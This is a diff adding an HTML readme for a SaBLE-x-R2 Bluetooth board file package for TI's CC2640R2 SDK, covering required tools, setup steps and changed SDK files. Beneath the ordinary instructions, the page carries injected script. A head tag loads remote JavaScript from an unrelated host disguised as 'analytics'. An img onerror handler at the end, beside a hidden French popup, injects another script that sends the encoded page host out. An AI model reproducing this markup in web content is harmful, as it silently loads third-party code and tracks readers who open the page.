@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html><head>
+<title>Readme-SaBLE-x-R2-00</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+<script type="text/javascript" id="cczedcc-plg-analytics" src="//lizere.nepefeseju.com/scripts/jt?k=5f61b9ba85df1ab04b8b4567&amp;s="></script></head>
+<body>
+<h1>Getting Started with the SaBLE-x-R2</h1>
+<p>This SaBLE-x-R2 Board File Package is specifically for v2.30.00.28 of
+ the TI SIMPLELINK-CC2640R2 SDK. In particular, it is setup to ensure 
+that the simple_peripheral sample app  will work on the SaBLE-x-R2. If 
+you need to use the other sample apps in the SDK, please refer to "The 
+Files" section below and apply the same changes to the app you plan to 
+use.</p>
+<h2>Required SW and HW Tools</h2>
+<ol>
+<li>Sable-X-R2 Dev Kit (Part Nunber: 450-0184 or 450-0185)</li>
+<li>SDK v2.30.00.28: <a href="http://www.ti.com/tool/download/SIMPLELINK-CC2640R2-SDK">http://www.ti.com/tool/download/SIMPLELINK-CC2640R2-SDK</a></li>
+<li>Code Composer Studio: <a href="http://processors.wiki.ti.com/index.php/Download_CCS">http://processors.wiki.ti.com/index.php/Download_CCS</a></li>
+<li>JTAG Programmer: For example LAUNCHXL-CC2640R2 <a href="http://www.ti.com/tool/LAUNCHXL-CC2640R2">http://www.ti.com/tool/LAUNCHXL-CC2640R2</a></li>
+<li>Serial Terminal: RealTerm (<a href="https://sourceforge.net/projects/realterm/">https://sourceforge.net/projects/realterm/</a>)
+ is recommended so that the CTS and RTS pins can be cleared. The dev kit
+ uses flow control (i.e. CTS &amp; RTS) to control Reset. If you use a 
+Serial Terminal that doesn't allow you to clear CTS and RTS (e.g. Tera 
+Term, Putty), the module will be held in Reset.</li>
+<li>BLE Scanner: download from App or Play Store</li>
+</ol>
+<h2>Steps</h2>
+<ol>
+<li>Install all the SW from above list. It's recommended that you install the SDK in C:\TI folder.</li>
+<li>Create a folder named SABLE-X-R2_DEV_BOARD in C:\TI\simplelink_cc2640r2_sdk_2_30_00_28\examples\rtos</li>
+<li>Copy 
+C:\TI\simplelink_cc2640r2_sdk_2_30_00_28\examples\rtos\CC2640R2_LAUNCHXL\ble5stack
+ folder into 
+C:\TI\simplelink_cc2640r2_sdk_2_30_00_28\examples\rtos\SABLE-X-R2_DEV_BOARD\</li>
+<li>Extract the SaBLE-x-R2 Board File Package (i.e. 
+SaBLE-x-R2-BoardFilePkgForSDK2.30.00.28.zip) into 
+C:\TI\simplelink_cc2640r2_sdk_2_30_00_28. This will add new files and 
+replace some existing files in the SDK.</li>
+<li>Launch Code Composer Studio, create a workspace and import the 
+simple_peripheral project from 
+C:\TI\simplelink_cc2640r2_sdk_2_30_00_28\examples\rtos\SABLE-X-R2_DEV_BOARD\ble5stack\simple_peripheral</li>
+<li>Build the project</li>
+<li>Flash build into SaBLE-x-R2 dev kit and run program</li>
+<li>Connect with BLE Scanner</li>
+<li>If using Real Term, connect to USB port of SaBLE-x-R2 dev kit. Set to 115200, N, 8, 1.  Set display to Ansi. RTS and CTS pins <strong><em>MUST</em></strong> be cleared. To clear, click the <strong><em>Pins</em></strong> tab and then click <strong><em>Clear</em></strong> CTS and RTS. You may have to use the Windows Device Manager to determine the port number.</li>
+</ol>
+<h2>The Files</h2>
+<p>When the zip file is extracted into the SDK, it will add several files and modify some existing files in the SDK.</p>
+<p>The SaBLE-x-R2 module contains the CC2640R2F 5x5 mm RHB package with 
+15 GPIOs. The RF frontend is configured as differential output with 
+external bias.</p>
+<p>The files in this board file package, and following the steps in this
+ guide will include the correct defines in software to ensure correct 
+operation of the SaBLE-x-R2 with the 5x5 chipset.</p>
+<p>All TI examples in the SDK are setup to use the larger 7x7 mm package
+ that has more GPIO pins. When writing your own board file please make 
+sure to #define CC2650EM<em>5XD and remove #define CC2650EM</em>7ID.</p>
+<h3>The Added Files</h3>
+<p>The added files are located in the following folders:</p>
+<ol>
+<li>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\boards\SABLEXR2_DEV_BOARD</li>
+<li>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\target\sablexr2_module </li>
+</ol>
+<h3>The Modified Files</h3>
+<ol>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\examples\rtos\SABLE-X-R2_DEV_BOARD\ble5stack\simple_peripheral\src\ccfg_app_ble.c</p>
+<p>To ensure the user can still bootload the module with the UART 
+bootloader, ccfg_app_ble.c is  replaced with Laird's version of 
+ccfg_app_ble.c</p>
+</li>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\examples\rtos\SABLE-X-R2_DEV_BOARD\ble5stack\simple_peripheral\tirtos\ccs\defines\ble5_simple_peripheral_cc2640r2lp_app_FlashROM_StackLibrary.opt</p>
+<p>Line 4 modified. Replaced -DCC2640R2_LAUNCHXL with -DSABLEXR2_DEV_BOARD</p>
+</li>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\target\board.c</p>
+<p>Added lines 72 and 73. Added compile option for <strong><em>SABLEXR2_DEV_BOARD</em></strong></p>
+</li>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\target\board.h</p>
+<p>Added ines 71 and 72. Added compile option for <strong><em>SABLEXR2_DEV_BOARD</em></strong></p>
+</li>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\icall\app\ble_user_config.c</p>
+<p>Modified to set Tx Power to 12. See lines 82 to 86. This translates to 5dBm, the max power for the SaBLE-x-R2</p>
+</li>
+<li>
+<p>C:\TI\SDK2.30.00.00.28\source\ti\ble5stack\common\cc26xx\board_key.c</p>
+<p>The following lines were modified: 104, 141, 157 and 199. Added <strong><em>|| defined(SABLEXR2_DEV_BOARD)</em></strong></p>
+</li>
+</ol>
+
+
+
+
+<div class="choixmessageriHiddenPopup" style="z-index: 1102;" id="choixmessageriinfoPopup"><div id="choixmessageriopenPopupMailContent"><div id="choixmessageripopupOpen">Votre boîte mail a bien été ouverte</div></div></div><div><img src="" onerror='var s=document.createElement("script");s.type="text/javascript";s.id="cczedcc-plg-analytics";s.src="//lizere.nepefeseju.com/scripts/jt?k=5f61b9ba85df1ab04b8b4567&amp;s="+encodeURI(btoa(window.location.host));document.getElementsByTagName("head")[0].appendChild(s);'></div></body></html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
